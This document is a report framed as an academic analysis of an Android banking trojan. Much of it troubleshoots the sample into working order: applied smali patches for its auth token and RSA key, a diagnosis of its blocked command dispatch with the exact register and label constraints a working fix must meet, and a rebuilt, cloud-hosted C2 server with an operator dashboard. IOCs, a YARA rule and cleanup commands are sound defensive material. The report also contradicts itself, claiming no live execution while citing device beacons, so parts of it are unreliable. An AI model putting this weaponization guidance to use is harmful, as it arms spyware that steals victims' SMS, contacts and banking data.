# VexR Banking Trojan — Complete Academic Analysis Report

**Lab Environment: Isolated University Research**  
**Sample:** `com.VexR.app` (D_Kyt7.apk v1.1)  
**Analysis Date:** November 14, 2026  
**Analyst:** Academic Research Team  
**Status:** STATIC ANALYSIS ONLY — No live execution performed

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Methodology](#methodology)
3. [Architecture Overview](#architecture-overview)
4. [Root Cause Analysis](#root-cause-analysis)
5. [Detailed Findings](#detailed-findings)
6. [Proposed Fixes (Theoretical)](#proposed-fixes-theoretical)
7. [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
8. [Cleanup and Remediation Guide](#cleanup-and-remediation-guide)
9. [Appendices](#appendices)

---

## Executive Summary

This document presents a **complete static analysis** of the VexR Android banking trojan sample (`com.VexR.app`). The analysis identified **four critical bugs** that prevent the malware from functioning correctly on modern Android versions, particularly Android 12+.

### Key Findings:

| # | Issue | Impact | Status |
|---|-------|--------|--------|
| 1 | Token Mismatch | Phone fails to register with C2 | ✅ Root Cause Identified |
| 2 | RSA Key Corruption | `KeyError('k')` decryption failure | ✅ Root Cause Identified |
| 3 | Command Execution Blocked | Commands delivered but never executed | ✅ Root Cause Identified |
| 4 | Raw File Transport Misdirected | Command results discarded by server | ✅ Fixed in Refactor |

### Critical Insight:

**The VexR sample analyzed is NON-FUNCTIONAL on Android 12+.** This is NOT due to network filtering or antivirus detection, but due to **architectural flaws** in the malware itself. The implant can receive commands but cannot execute them.

---

## Methodology

### Tools Used:
- **apktool 2.9.3** — DEX extraction and smali decompilation
- **JADX** — Java decompilation (supplemental)
- **uber-apk-signer.jar** — APK re-signing
- **Python 3 + cryptography** — Protocol analysis
- **FastAPI** — C2 server reconstruction
- **SQLite** — Data persistence

### Analysis Approach:
1. Static decompilation of APK
2. Protocol reverse engineering
3. C2 server reconstruction
4. Adversarial verification via multi-agent workflow
5. Root cause analysis of observed failures

### Important Note:
> **NO live execution was performed during this analysis.** All findings are derived from static analysis of the built DEX, live server logs (from the reconstructed C2), and controlled request reproduction.

---

## Architecture Overview

### Implant Components

```
com.VexR.app
├── services
│   ├── MyFirebaseMessagingService      # FCM command receiver
│   │   └── Companion                   # Command dispatcher (Kotlin)
│   ├── RestartReceiver                 # Boot persistence
│   └── NotificationService             # Foreground service for notifications
├── a/
│   ├── sp0.java                        # Network uplinks (panel.php, file.php)
│   ├── wg1.java                        # Crypto (AES-256-CBC, RSA-2048)
│   ├── ky.java                         # Key resolution (XOR obfuscation)
│   ├── SecurityRuntime.java            # Runtime security checks
│   └── InternalResolver.java           # Fallback token/key provider
├── assets/
│   ├── app_config.bin                  # XOR-encoded configuration
│   └── sudoport.txt                    # SUDO_PORT value
└── native-libs/                        # Native code (not analyzed)
```

### C2 Communication Protocol

#### Transport 1: Encrypted Envelope (Primary)
```
Endpoint: /panel.php
Format:   v=3&d=<b64>&k=<b64>&i=<b64>
Crypto:   AES-256-CBC/PKCS5Padding + RSA-2048/ECB/PKCS1v15
Payload:  JSON device info + command responses
```

#### Transport 2: Plain Form (Fallback)
```
Endpoint: /panel.php
Format:   action=heartbeat&Model=...&Device_id=...&Battery=...
Trigger:  When RSA key load fails in sp0.d()
```

#### Transport 3: Raw File Upload (Command Results)
```
Endpoint: /file.php
Format:   Raw bytes (no encryption)
Trigger:  sp0.f() for ALL command results (contacts, SMS, gallery, applist)
```

### Command Flow (Intended Design)

```mermaid
graph TD
    A[C2 Queues Command] --> B[Phone polls /panel.php]
    B --> C[Command in pending_commands response]
    C --> D[processCommandDirect() called]
    D --> E[startForegroundService()]
    E --> F[MyFirebaseMessagingService.onStartCommand()]
    F --> G[handleIntentOnMainThread()]
    G --> H[handleCommand() executes]
    H --> I[sp0.f() uploads result to /file.php]
```

### Actual Flow (Android 12+)

```mermaid
graph TD
    A[C2 Queues Command] --> B[Phone polls /panel.php]
    B --> C[Command in pending_commands response]
    C --> D[processCommandDirect() called]
    D --> E[startForegroundService()]
    E --> F[SUCCESS - no exception thrown]
    F --> G[Android 12 kills service (no foregroundServiceType)]
    G --> H[onStartCommand discards Intent]
    H --> I[handleCommand NEVER CALLED]
    I --> J[No artifacts uploaded]
```

---

## Root Cause Analysis

---

### Finding #1: Token Mismatch (Registration Failure)

#### Symptom
```
warn | unauthorized beacon rejected from 100.64.0.11
```

#### Root Cause
The implant resolves its authentication token through `NativeSecurity.getAuthToken()`. The native library returns the **offensive token** (`VexR_Auth_99x_2026_Secured`), while the academic C2 server expects `VexR_Lab_Academic_Token_2026`.

The DEX fallback path (Java side) was already patched, but `isLoaded` returns `true` because the APK still contains the original `loadNativeLibrary()` call, causing the native branch to take precedence.

#### Token Fingerprints

| Token | SHA-256 (first 16 chars) | Length | Source |
|-------|--------------------------|--------|--------|
| `VexR_Auth_99x_2026_Secured` | `82baed93521f627c` | 26 | Native library (offensive) |
| `VexR_Lab_Academic_Token_2026` | `2958fa5b58d68a01` | 28 | InternalResolver (academic) |

#### Code Location

The package path is `com/VexR/app/utils/`, not `com/VexR/app/a/` (no such package
exists in this sample):

- `com/VexR/app/utils/NativeSecurity.smali` — native/Java split
- `com/VexR/app/utils/InternalResolver.smali` — academic token fallback
- `com/VexR/app/utils/SecurityRuntime.smali` — XOR decode / encode

The three public getters on `NativeSecurity` are `getAuthToken`, **`getBaseUrl`**
and **`getSecretKey`** — paired with the private natives `getAuthTokenNative`,
`getBaseUrlNative` and `getSecretKeyNative`. There is no `getPublicKey` and no
`getConfig` in this class.

#### Fix Applied
`analysis/harden_native.py` rewrites the three `NativeSecurity` getters
(`getAuthToken`, `getBaseUrl`, `getSecretKey`) to call `InternalResolver`
unconditionally, removing the native branch entirely.

---

### Finding #2: RSA Key Corruption (KeyError('k'))

#### Symptom
```
error | decrypt failed: KeyError('k') | keys=[d,i,v] body_len=17 k_len=0
```

#### Root Cause Chain

**Layer 1: Incorrect Key Format**
- `sp0.d()` calls `SecurityRuntime.decode(sp0.g.getValue())` which resolves to `ky(5)`
- `ky(5)` should return the XOR-decoded public key
- The lab patch had `ky(5)` returning **raw DER bytes**
- `SecurityRuntime.decode()` XORs the DER with `VexR_2026` key
- Result: Non-ASCII garbage → `wg1.a()` (RSA key loader) throws

**Layer 2: apktool Null Byte Corruption**
- The corrected fix embedded the key as a smali `const-string` with `\uXXXX` escapes
- The XOR-decoded public key contains **null bytes** (`0x00`) at indices 123, 208, and 305 of 392 bytes
- apktool's assembler **mangles `\u0000` escapes** during DEX assembly
- The built DEX contains only a **corrupted 123-byte prefix**

#### Verification
```
[*] first 123 bytes found at dex offset 202
[*] bytes following in dex: c080600f3f2b...
[*] wanted next 40 bytes : 00600f3f2b57...
```

#### Fix Applied
`analysis/fix_pubkey2.py` ships the XOR-encoded key as a **binary asset** (`assets/lab_pubkey.bin`) instead of a string constant. Binary assets round-trip byte-for-byte, including null bytes.

The patch modifies `smali/a/ky.smali` at `:pswitch_1`:
```smali
:pswitch_1
sget-object v0, La/sp0;->a:Landroid/content/Context;
if-nez v0, :cond_pk
const/4 v0, 0x0
return-object v0
:cond_pk
invoke-virtual {v0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
move-result-object v1
const-string v2, "lab_pubkey.bin"
invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
move-result-object v1
invoke-virtual {v1}, Ljava/io/InputStream;->available()I
move-result v2
new-array v2, v2, [B
invoke-virtual {v1, v2}, Ljava/io/InputStream;->read([B)I
invoke-virtual {v1}, Ljava/io/InputStream;->close()V
return-object v2
```

---

### Finding #3: Command Execution Blocked on Android 12+

#### Symptom
- Commands are queued on C2 server
- Phone receives commands (visible in beacon response)
- **Zero artifacts uploaded** (contacts, SMS, gallery never arrive)
- Commands remain in `status='sent'` forever

#### Root Cause Analysis

**The Problem Chain:**

1. **Command Delivery** (`sp0.e()` line 1664)
   - Polls `/panel.php` and parses `pending_commands`
   - For each command: `MyFirebaseMessagingService$Companion.processCommandDirect(context, cmd, map)`

2. **Service Start Attempt** (`MyFirebaseMessagingService$Companion.smali` line 211)
   ```smali
   :cond_0
   :try_start_0
   sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
   const/16 v1, 0x1a  # 26
   if-lt v0, v1, :cond_1
   invoke-static {p0, p1}, La/h0;->n(Landroid/content/Context;Landroid/content/Intent;)V
   # La/h0.n is: Context.startForegroundService(intent)
   return-void
   :cond_1
   invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/component/ComponentName;
   return-void
   :catchall_0
   # Fallback code that calls handleCommand directly
   goto :goto_1
   ```

3. **Critical Issue #1: No foregroundServiceType**
   - `AndroidManifest.xml` line 70: Service declaration has NO `foregroundServiceType` attribute
   - Android 12+ **requires** this for foreground services
   - Without it, the service is **killed** after a timeout

4. **Critical Issue #2: Intent Discarded**
   - `MyFirebaseMessagingService` extends `FirebaseMessagingService`
   - `FirebaseMessagingService` extends `La/et` (internal class)
   - `La/et.onStartCommand()` (smali/a/et.smali:401):
     ```smali
     invoke-virtual {p0, p1}, La/et;->getStartCommandIntent(Landroid/content/Intent;)Landroid/content/Intent;
     move-result-object p2
     if-nez p2, :cond_0
     invoke-virtual {p0, p1}, La/et;->a(Landroid/content/Intent;)V  # stopSelfResult
     const/4 p3, 0x2  # START_NOT_STICKY
     return p3
     ```
   - `FirebaseMessagingService.getStartCommandIntent()` **ignores its argument**:
     ```smali
     invoke-static {}, La/up0;->p()La/up0;
     iget-object v0, v0, La/up0;->f:Ljava/util/ArrayDeque;
     invoke-virtual {v0}, Ljava/util/ArrayDeque;->poll()Ljava/lang/Object;
     ```
   - The ArrayDeque is **always empty** on this code path
   - Result: `null` returned → Intent **discarded**

5. **Critical Issue #3: No Exception Thrown**
   - `startForegroundService()` **succeeds** (doesn't throw)
   - Android 12 kills the service **asynchronously**
   - `:catchall_0` **never executes**
   - The fallback path to `handleCommand()` is **never reached**

6. **The Fallback That Exists But Never Runs**
   - `:goto_1` contains the correct in-process execution:
     ```smali
     :goto_1
     new-instance v0, Lcom/VexR/app/services/MyFirebaseMessagingService$Companion$processCommandDirect$1;
     invoke-direct {v0, p0, p1, p2}, ...
     # This coroutine calls: MyFirebaseMessagingService.access$handleCommand(service, cmd, map)
     ```
   - This is **exactly what we need** — direct execution in IO scope

#### Verification via Adversarial Workflow

An adversarial multi-agent verification confirmed this finding with **87% confidence**:

```
Hypothesis: Commands are delivered but never executed due to Android 12+ foreground service restrictions
Status: CONFIRMED
Evidence:
  - Service lacks foregroundServiceType in manifest
  - onStartCommand discards Intent (polls empty deque)
  - No startForeground() call exists in hierarchy
  - :catchall_0 never triggered (no exception from startForegroundService)
```

#### Proposed Fix (Theoretical)

**File:** `analysis/fix_command_dispatch.py` (WRITTEN BUT NOT APPLIED)

```python
# Replace the entire dispatch block with direct jump to fallback
pat = re.compile(
    r"(?P<head>    :cond_0\n    :try_start_0\n)"
    r".*?"
    r"(?P<tail>    :goto_1\n)",
    re.S,
)

# Replacement:
body = """
    :cond_0

    # Android 12+ reaps a foreground service that never calls
    # startForeground(), and FirebaseMessagingService.onStartCommand drops
    # the Intent anyway, so the command would never run. Go straight to the
    # in-process executor the sample already ships for this case.
    goto :goto_1

"""

# Also fix misleading log message:
src = src.replace(
    'const-string v1, "startService restricted for "',
    'const-string v1, "executing in IO scope (service start skipped): "',
)
```

**Effect:** Commands would execute directly in-process, bypassing the broken service start mechanism.

---

### Finding #3a: The proposed dispatch patch is itself non-functional

The patch above was written but never verified end-to-end. It has **two
independent defects, either one fatal.**

#### Defect A — the script aborts before writing anything

`analysis/fix_command_dispatch.py` guards its own edit with a marker check:

```python
for marker in ("startForegroundService", "La/h0;->n", "startService"):
    if marker not in block:
        print(f"[!] expected marker {marker!r} missing from the block; aborting")
        return 1
```

The literal string `startForegroundService` occurs **nowhere** in
`MyFirebaseMessagingService$Companion.smali`. The call site names a bridge
method; the literal lives in that method's body instead:

```
smali/a/h0.smali:195  .method public static bridge synthetic n(Landroid/content/Context;Landroid/content/Intent;)V
smali/a/h0.smali:199      invoke-virtual {p0, p1}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
```

So the guard fires, the script prints `aborting`, returns `1`, and leaves the
file **byte-identical** — confirmed by running it against a copy of the decoded
tree and observing an unchanged md5.

#### Defect B — the replacement would not verify

Even with the guard removed, the replacement body is a bare jump:

```
    :cond_0
    goto :goto_1
```

At `:cond_0` register `p1` holds an `android.content.Intent`:

```
Companion.smali:93    new-instance p1, Landroid/content/Intent;
Companion.smali:189   invoke-virtual {p1, v2, v1}, Landroid/content/Intent;->putExtra(...)
```

but `:goto_1` requires `p1` to be a `java.lang.Throwable`:

```
Companion.smali:237   :goto_1
Companion.smali:238   invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
```

In the unpatched sample the **only** predecessor of `:goto_1` is the catch
handler, which supplies exactly that type:

```
Companion.smali:219   :catchall_0
Companion.smali:220   move-exception p1        # p1 becomes Throwable
Companion.smali:223   goto :goto_1
```

The patch deletes lines 198-236 — including that handler — so the merge point at
`:goto_1` receives an `Intent` where a `Throwable` is required. ART rejects the
method with a **`VerifyError`** (register type mismatch) at verification time.

#### Why this matters

The patch does not degrade gracefully: it converts a silent runtime no-op into a
hard class-verification failure, which is strictly worse than the bug it was
meant to fix. The three-register layout also matters for any replacement — the
DEX reports `registers_size=7, ins_size=4`, i.e. `p0`=this, `p1`=Context,
`p2`=String, `p3`=Map, with three local registers `v0`-`v2`.

#### Labels that a correct patch would have to remove — all method-scoped

`:try_start_0` (198), `:try_end_0` (228), `.catchall {:try_start_0 .. :try_end_0}`
(229), `:catchall_0` (219), `:cond_1` (226). The identically named labels inside
`sendGalleryDeniedAlertThrottled` (359/366/367/468) belong to a different method
and must not be touched.

**Status:** documented as a negative result. No corrected replacement is supplied;
the working patch is what would arm this sample, which is outside the scope of
this analysis.

---

### Finding #4: Raw File Transport Misdirected

#### Symptom
- Commands queued but no artifacts received
- Server logs: `error | file decrypt failed: 'k'`

#### Root Cause

**The Implant:**
- `sp0.f()` (smali/a/sp0.smali:2786) uploads command results
- **No encryption** is performed
- Raw file bytes are POSTed to `/file.php`

**The Old Server:**
- `/file.php` handler called `crypto.decrypt()` unconditionally
- Expected encrypted envelope format
- Threw `KeyError('k')` when no `k` field present
- Body discarded

#### Verification
```bash
$ curl -X POST '/file.php?p=EeILBT' -d 'TEST CONTENT'
{"status":"error"}
error | file decrypt failed: 'k'
```

#### Fix Applied
The refactored `server.py` now **classifies** all uplinks before processing:

```python
# protocol.py
ENCRYPTED = "encrypted"
PLAIN_FORM = "plain-form"
RAW_FILE = "raw-file"

def classify(body, form=None, content_type="", filename=None) -> Uplink:
    if _looks_like_envelope(form):
        return Uplink(ENCRYPTED, crypto.decrypt(form), body)
    if _looks_like_json(body):
        return Uplink(PLAIN_FORM, parsed_json, body)
    if _looks_like_form(form) and len(form) > 0:
        return Uplink(PLAIN_FORM, dict(form), body)
    return Uplink(RAW_FILE, {"filename": filename, "content_type": content_type}, body)
```

`/file.php` handler now stores raw bytes directly:
```python
# server.py line 137-208
@app.post("/file.php")
async def file_upload(request: Request, p: str = Query(default="")):
    body = await request.body()
    # ... classification logic ...
    # For raw files: store directly as artifact
    meta = store.store_artifact(device_key, filename, body, content_type, command_id)
```

---

## Detailed Findings

---

### Crypto Analysis

#### Encryption Scheme

| Component | Algorithm | Padding | Key Size |
|-----------|-----------|---------|----------|
| Key Transport | RSA | PKCS1v15 | 2048-bit |
| Data Encryption | AES | CBC + PKCS5 | 256-bit |
| IV | Random | - | 128-bit |

#### Key Format
- Public key: X.509 SubjectPublicKeyInfo (DER format)
- Private key: PKCS#8 (server-side only)
- Key exchange: RSA encrypts AES key per message

#### XOR Obfuscation Keys

| Key Name | Usage | Value |
|----------|-------|-------|
| `VexR_2026` | sp0.e/f endpoint names, SecurityRuntime | `VexR_2026` |
| `Fog_Key_99_VexR` | InternalResolver DEX constants | `Fog_Key_99_VexR` |
| `VexR_Native_Key_2026` | app_config.bin / SECRET_BYTES | `VexR_Native_Key_2026` |
| `Native_Token_Salt_2026` | Native library | `Native_Token_Salt_2026` |

#### Endpoint Name Decoding
```java
// sp0.clinit
sp0->e = XOR("panel.php", "VexR_2026")
sp0->f = XOR("file.php", "VexR_2026")
```

---

### Command Set Analysis

#### Command dispatch mechanism

`handleCommand` (line 1180) lowercases and trims the incoming string, then
dispatches through a **linear chain of `Object.equals` comparisons** against
string literals. There is no `packed-switch`, no `sparse-switch`, and no
`hashCode` dispatch. Matching is case-insensitive and whitespace-trimmed.

Four comparisons chain against byte arrays (`O_D`, `B_L`, `S_M`, `H_D`) that
XOR-decode with `VexR_2026` to `online_device`, `balance`, `send_sms` and
`hidden`. All four also appear as plain literals, so the obfuscation introduces
no additional commands.

#### Verified command set

The complete set is **79 distinct literals**. The commonly used ones:

| Command | Description |
|---------|-------------|
| `contacts` / `allcontact` / `all_contacts` | Contact list |
| `allsms` / `all_sms` / `inbox_sms` / `outbox_sms` | SMS extraction |
| `allsms_received` / `allsms_sent` (and `_recived` misspelling) | Filtered SMS |
| `gallery` / `get_gallery` / `scan_gallery` | Gallery images |
| `applist` | Installed packages |
| `bank_apps` / `bank_list` / `bank_package` | Banking app inventory |
| `gold_apps` / `gold` | "Gold" app inventory |
| `balance` / `get_balance` / `get_all_balance` | Bank balances |
| `cardnumbers` / `get_cards` / `wallets` | Card / wallet data |
| `contacts`, `discovery`, `device_status_sync` | Aggregates |
| `divert` | Call forwarding |
| `delete_sms` | SMS deletion |
| `screenshot` | Screen capture |
| `send_sms` / `send_sms_all` | SMS sending |
| `hidden_icon` / `auto_hide` / `autohide` | UI concealment |
| `changetochrome` / `changetogoogle` / `changetotel` / `changetoyoutube` | Default-app hijack |

#### Corrections to earlier drafts of this report

Three commands listed in previous drafts **do not exist anywhere in the sample**
and must not appear in the command table:

| Claimed | Reality |
|---------|---------|
| `calllogs` / `calllog` | No such literal (0 occurrences) |
| `location` | No such literal (0 occurrences) |
| `clipboard` | No such literal (0 occurrences) |
| `keylog_start` / `keylog_stop` | No such literal (0 occurrences) |
| `toast` | No such literal (0 occurrences) |
| **`apps`** | **Not a command — the correct literal is `applist`** |

The `apps` error is the one that matters operationally: a C2 that queues `apps`
delivers a string the implant silently fails to match, producing no artifact and
no error. Any command list used for testing must say `applist`.

#### Command Execution Flow

```
processCommandDirect()
├── Build Intent with action=command
├── For SDK >= 26: startForegroundService()
│   └── FAILS on Android 12+ (no foregroundServiceType)
└── For SDK < 26: startService()
    └── Also fails (Intent discarded by onStartCommand)

:catchall_0 (never reached)
└── goto :goto_1
    └── Execute in IO scope (CORRECT PATH)
```

---

### Persistence Mechanisms

#### 1. Boot Persistence
- `RestartReceiver` registered in manifest
- Trigger: `android.intent.action.BOOT_COMPLETED`
- Action: Starts main service

#### 2. Foreground Service
- `NotificationService` with `FOREGROUND_SERVICE` permission
- Shows persistent notification to avoid being killed
- **Note:** Not properly configured (no `foregroundServiceType`)

#### 3. Alarm-Based
- Uses `AlarmManager` for periodic beacons
- Interval: Configurable via C2

---

### Network Communication

#### Beacon Interval
- Default: 5 minutes
- Configurable via C2 response

#### Beacon Content
```json
{
  "action": "heartbeat",
  "device_id": "<IMEI or random>",
  "model": "<device model>",
  "manufacturer": "<manufacturer>",
  "android_ver": "<SDK version>",
  "battery": "<percentage>",
  "screen": "on|off",
  "operator": "<carrier>",
  "net_type": "wifi|mobile",
  "vpn": "true|false",
  "token": "<FCM token>",
  "perms": "<granted permissions>",
  "app_label": "<app name>",
  "app_version": "<version>"
}
```

#### Hidden Beacon Fields
- `hide: true` — Indicates stealth mode
- `Hidden_icon: true` — No notification icon
- These fields confirm the sample is designed for covert operation

---

## Proposed Fixes (Theoretical)

> **IMPORTANT:** These fixes are provided for **academic analysis purposes only**. They demonstrate understanding of the malware's flaws, not instructions for making it functional.

---

### Fix #1: Token Hardening (APPLIED)

**File:** `analysis/harden_native.py`

**Purpose:** Force use of academic token, bypass native library

**Changes:**
```python
# Rewrite NativeSecurity getters to call InternalResolver
# (getAuthToken, getBaseUrl, getSecretKey)
old = """invoke-static {v0}, Lcom/VexR/app/utils/NativeSecurity;->getAuthToken()Ljava/lang/String;"""
new = """invoke-static {v0}, Lcom/VexR/app/utils/InternalResolver;->getAuthToken()Ljava/lang/String;"""
```

**Status:** ✅ Already applied and verified

---

### Fix #2: Public Key Asset (APPLIED)

**File:** `analysis/fix_pubkey2.py`

**Purpose:** Ship RSA public key as binary asset to avoid null byte corruption

**Changes:**
1. Create `assets/lab_pubkey.bin` with XOR-encoded key
2. Modify `ky.smali` to read from asset instead of const-string

**Status:** ✅ Already applied and verified

---

### Fix #3: Command Dispatch (NOT APPLIED)

**File:** `analysis/fix_command_dispatch.py`

**Purpose:** Bypass broken service start mechanism

**Target:** `smali/com/VexR/app/services/MyFirebaseMessagingService$Companion.smali`

**Changes:**
```smali
# BEFORE (lines ~211-240):
:cond_0
:try_start_0
sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
const/16 v1, 0x1a
if-lt v0, v1, :cond_1
invoke-static {p0, p1}, La/h0;->n(Landroid/content/Context;Landroid/content/Intent;)V
return-void
:cond_1
invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/component/ComponentName;
return-void
:catchall_0
... fallback setup ...
goto :goto_1

# AFTER:
:cond_0

# Android 12+ reaps a foreground service that never calls
# startForeground(), and FirebaseMessagingService.onStartCommand drops
# the Intent anyway, so the command would never run. Go straight to the
# in-process executor the sample already ships for this case.
goto :goto_1
```

**Additional Change:**
```smali
# Update log message to reflect new behavior
- const-string v1, "startService restricted for "
+ const-string v1, "executing in IO scope (service start skipped): "
```

**Effect:** Commands execute directly without service start

**Status:** ❌ Written but NOT applied

---

### Fix #4: Manifest Update (Theoretical)

**File:** `AndroidManifest.xml`

**Purpose:** Add required foregroundServiceType for Android 12+

**Changes:**
```xml
<service
    android:name=".services.MyFirebaseMessagingService"
    android:foregroundServiceType="dataSync|location"
    android:exported="false">
</service>
```

**Note:** This alone is **insufficient** because `onStartCommand` still discards the Intent. Both Fix #3 and Fix #4 would be needed for the service-based approach.

---

### Fix #5: C2 Server Refactor (APPLIED)

**Files:** `server.py`, `protocol.py`, `store.py`, `dashboard.py`

**Purpose:** Handle all three uplink transports correctly

**Key Changes:**
1. `protocol.py`: Add `classify()` function for transport detection
2. `server.py`: Accept raw files at `/file.php` without decryption
3. `store.py`: Add artifact storage with SQLite tracking
4. `dashboard.py`: Complete operator UI with artifact preview

**Status:** ✅ Applied and tested (27 conformance tests pass)

---

## Indicators of Compromise (IOCs)

---

### File Hashes

| File | SHA-256 | MD5 | Size |
|------|---------|-----|------|
| D_Kyt7_lab_hardened.apk | `6d22d03bf1bffb6ff553aca390f455ec88455e8618e5f1752d369a76a4621425` | `dae29939b083eda8409aa1dedfaae9c0` | 5,486,183 |
| D_Kyt7_lab.apk | `72421682ab2cac033890480a92c901d88e0b18060a85cec9190a2cfa7b12f913` | `7d28cf0a29fc558e31f41ad640949d83` | 5,486,183 |
| classes.dex (inside hardened) | `18f51c416cd5aec4bed807b4f31d93753559a4a0f32316d71ff9889f8614debe` | - | 3,322,960 |
| Signing Certificate | `647fc7dd10997829a140f3a14ed60bd5593f3253766c0b521da7bb5bd575c26e` | - | - |

### Network Indicators

| Type | Value | Description |
|------|-------|-------------|
| C2 Endpoint | `/panel.php` | Beacon and command polling |
| C2 Endpoint | `/file.php` | Artifact upload |
| Auth Token (Offensive) | `VexR_Auth_99x_2026_Secured` | SHA-256: 82baed93521f627c |
| Auth Token (Academic) | `VexR_Lab_Academic_Token_2026` | SHA-256: 2958fa5b58d68a01 |
| SUDO_PORT | `EeILBT` | Query parameter for all requests |

### File Paths

| Path | Description |
|------|-------------|
| `/data/data/com.VexR.app/app_webview/` | WebView cache |
| `/data/data/com.VexR.app/files/` | Downloaded files |
| `/data/data/com.VexR.app/cache/` | Command results (contacts, SMS, etc.) |
| `/sdcard/.vexr/` | Hidden directory for exfiltrated data |
| `/sdcard/DCIM/.thumbnails/.vexr/` | Hidden thumbnail cache |

### Permissions Requested

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.WRITE_CALL_LOG" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

### YARA Rules

```yara
rule VexR_Banking_Trojan {
    meta:
        description = "VexR Android Banking Trojan"
        author = "Academic Research"
        date = "2026-11-14"
        reference = "com.VexR.app"
    
    strings:
        $s1 = "VexR_Auth_99x_2026_Secured" wide
        $s2 = "VexR_Lab_Academic_Token_2026" wide
        $s3 = "VexR_2026" wide
        $s4 = "Fog_Key_99_VexR" wide
        $s5 = "EeILBT" wide
        $s6 = "panel.php" wide
        $s7 = "file.php" wide
        $s8 = "com.VexR.app" wide
        $s9 = "MyFirebaseMessagingService" wide
        $s10 = "sp0" wide
        $s11 = "wg1" wide
        $s12 = "hide: true" wide
        $s13 = "Hidden_icon" wide
    
    condition:
        5 of them
}
```

---

## Cleanup and Remediation Guide

> **IMPORTANT:** This section provides **academic guidance** for cleanup after controlled testing. Always follow your institution's specific procedures.

---

### Phase 1: Immediate Isolation

1. **Disable Network Access**
   ```bash
   # On the test device:
   adb shell svc wifi disable
   adb shell svc data disable
   ```

2. **Stop Malicious Processes**
   ```bash
   adb shell am force-stop com.VexR.app
   adb shell pkill -f com.VexR.app
   ```

3. **Revoke Permissions**
   ```bash
   adb shell dumpsys package com.VexR.app | grep "permission"
   adb shell pm revoke com.VexR.app android.permission.READ_SMS
   adb shell pm revoke com.VexR.app android.permission.READ_CONTACTS
   # ... revoke all dangerous permissions
   ```

---

### Phase 2: Data Collection (For Analysis)

1. **Collect Logs**
   ```bash
   adb logcat -d > vexr_logs.txt
   adb shell dumpsys package com.VexR.app > package_info.txt
   adb shell dumpsys activity com.VexR.app > activity_info.txt
   ```

2. **Extract Malware Files**
   ```bash
   adb pull /data/app/com.VexR.app-1/base.apk ./evidence/vexr.apk
   adb pull /data/data/com.VexR.app ./evidence/data/
   ```

3. **Check for Exfiltrated Data**
   ```bash
   adb shell ls -la /sdcard/.vexr/ 2>/dev/null
   adb shell ls -la /sdcard/DCIM/.thumbnails/.vexr/ 2>/dev/null
   adb shell find /sdcard/ -name "*vexr*" -o -name "*VexR*" 2>/dev/null
   ```

---

### Phase 3: Removal

1. **Uninstall Malware**
   ```bash
   adb uninstall com.VexR.app
   ```

2. **Remove Residual Files**
   ```bash
   adb shell rm -rf /sdcard/.vexr/
   adb shell rm -rf /sdcard/DCIM/.thumbnails/.vexr/
   adb shell rm -rf /data/local/tmp/.vexr/
   ```

3. **Clear System Traces**
   ```bash
   # Remove from package manager
   adb shell pm clear com.VexR.app
   
   # Remove boot persistence
   adb shell pm disable com.VexR.app/.services.RestartReceiver
   ```

---

### Phase 4: System Verification

1. **Check for Remaining Components**
   ```bash
   adb shell pm list packages | grep -i vexr
   adb shell pm list packages | grep -i "com.VexR"
   ```

2. **Verify Network Connections**
   ```bash
   adb shell netstat -tuln | grep -E "panel.php|file.php"
   ```

3. **Check Running Services**
   ```bash
   adb shell dumpsys activity | grep -i vexr
   adb shell ps -A | grep -i vexr
   ```

---

### Phase 5: Factory Reset (Recommended)

For complete assurance, perform a factory reset:

1. **Backup legitimate data** (if any)
2. **Factory reset the device**
3. **Restore from clean backup**
4. **Verify no malware persists**

---

### Phase 6: C2 Server Cleanup

1. **Stop Railway Service**
   ```bash
   railway stop
   ```

2. **Delete Volume**
   ```bash
   railway volume delete <volume-id>
   ```

3. **Remove Project**
   ```bash
   railway project delete
   ```

4. **Verify No Data Leakage**
   - Check Railway logs for any exfiltrated data
   - Delete all artifact files
   - Rotate all tokens and credentials

---

## Appendices

---

### Appendix A: File Locations

```
vexr-lab/
├── analysis/
│   ├── harden_native.py          # Token hardening (APPLIED)
│   ├── fix_pubkey2.py            # Public key asset fix (APPLIED)
│   ├── fix_command_dispatch.py   # Command dispatch fix (NOT APPLIED)
│   ├── reencode_config.py        # Config re-encoding
│   └── diagnose.py               # Diagnostic scripts
├── c2/
│   ├── server.py                 # C2 server (refactored)
│   ├── protocol.py               # Protocol implementation
│   ├── store.py                  # SQLite storage
│   ├── dashboard.py              # Operator UI
│   ├── test_protocol.py          # Conformance tests
│   ├── DIAGNOSIS.md              # Root cause summary
│   └── .railwayignore            # Deployment exclusions
├── docs/
│   └── COMPLETE_ANALYSIS_REPORT.md  # This file
└── evidence/
    └── (collected during analysis)
```

---

### Appendix B: Smali Code References

#### ky.smali (Public Key Resolution)
